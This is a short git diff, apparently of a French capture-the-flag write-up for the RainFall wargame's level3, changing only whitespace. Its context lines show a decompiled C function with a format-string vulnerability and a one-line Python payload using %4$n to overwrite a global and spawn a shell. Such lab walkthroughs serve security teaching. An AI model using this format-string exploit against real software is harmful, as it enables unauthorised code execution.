@@ -13,14 +13,14 @@ int	m = 0;  // 0x804988c
 
 int		v() {  // 0x080484a4
 	char str[520];  // ebp-0x208 | esp+0x10 / size : 0x208
-  
+
 	fgets(str, 512, stdin);  // 0x200
 	printf(str);
 	if (m == 64) {  // 0x40
 		fwrite("Wait what?!\n", 1, 12, stdout);
 		system("/bin/sh");
 	}
-  return m;
+	return m;
 }
 
 int		main(int ac, char **av, char **envp) {  // 0x0804851a
@@ -161,7 +161,7 @@ On a donc tout ce qu'il nous faut pour écrire le script suivant :
 ## Exploit :
 
 ```sh
-level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08"+"\x90"*(0x40-4)+"%4$n"'; cat) | ./level3 
+level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08"+"\x90"*(0x40-4)+"%4$n"'; cat) | ./level3
 �������������������������������������������������������������
 Wait what?!
 whoami
